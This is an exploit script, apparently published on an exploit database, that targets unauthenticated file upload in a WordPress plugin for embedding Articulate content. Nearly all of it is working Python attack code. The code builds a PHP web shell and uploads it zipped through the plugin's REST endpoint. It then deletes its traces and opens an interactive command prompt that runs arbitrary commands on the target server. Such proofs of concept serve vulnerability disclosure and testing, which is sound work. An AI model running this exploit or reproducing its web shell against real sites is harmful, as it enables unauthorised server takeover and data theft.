# Exploit Title: Unauthenticated code execution in insert-or-embed-articulate-content-into-wordpress Wordpress plugin
# Description: It is possible to upload and execute a PHP file using the plugin option to upload a zip archive
# Date: 30/05/2022
# Exploit Author: Tris0n
# Vendor Homepage: https://wordpress.org/plugins/insert-or-embed-articulate-content-into-wordpress/
# Software Link: https://downloads.wordpress.org/plugin/insert-or-embed-articulate-content-into-wordpress.4.2995.zip
# VERSION: 4.2995 <= 4.2997 

import requests
import json
import urllib.parse
import os
import sys

s = requests.Session()

if(len(sys.argv) < 2):
    print("python3 "+sys.argv[0]+" ip")
    print("Example: python3 "+sys.argv[0]+" 127.0.0.1")
    exit()

ip = sys.argv[1].strip()

#create rev.zip
#==============================================================

os.system('echo \'<html>revshell</html>\' > index.html')
os.system('echo \'<?php system($_GET["command"]);?>\' > index.php')
os.system("zip shell.zip index.html index.php")


#upload file
#================================================================

url_upload = "http://"+ip+"/index.php/wp-json/articulate/v1/upload-data"
headers_upload = {
    "Content-Length": "1024",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarysKnNfBxBPGrZ9A4D",
    "Accept": "*/*",
    "Origin": "http://"+ip+"",
    "Referer": "http://"+ip+"/wp-admin/post-new.php",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "close"
}

file = open('shell.zip', 'rb')

data = '''
------WebKitFormBoundarysKnNfBxBPGrZ9A4D
Content-Disposition: form-data; name="name"

shell.zip
------WebKitFormBoundarysKnNfBxBPGrZ9A4D
Content-Disposition: form-data; name="chunk"

0
------WebKitFormBoundarysKnNfBxBPGrZ9A4D
Content-Disposition: form-data; name="chunks"

1
------WebKitFormBoundarysKnNfBxBPGrZ9A4D
Content-Disposition: form-data; name="file"; filename="shell.zip"
Content-Type: application/x-zip-compressed

''' + str(file.read().decode('cp437')) + '''

------WebKitFormBoundarysKnNfBxBPGrZ9A4D--
'''

upload_file = s.post(url=url_upload, headers=headers_upload, data=data.encode('cp437'))

json_response = upload_file.text
obj = json.loads(json_response)

# deleting zip files
#===========================================================================
os.system('rm -rf index.html index.php shell.zip')

# request to webshell :)
#===========================================================================

url_web_shell = "http://"+ip+"" + obj['path'].replace('index.html','index.php?command=')
web_shell = s.get(url=(url_web_shell + "whoami"))

if(len(web_shell.text) != 0):
    print("I Got a web shell '-'\n")
else:
    print("ERROR :(")

while True:
    command_input = str(input('CMD: '))

    if(command_input == 'exit'):
        exit()

    url_shell = url_web_shell + urllib.parse.quote(command_input)
    r = s.get(url=url_shell)
    print(r.text)
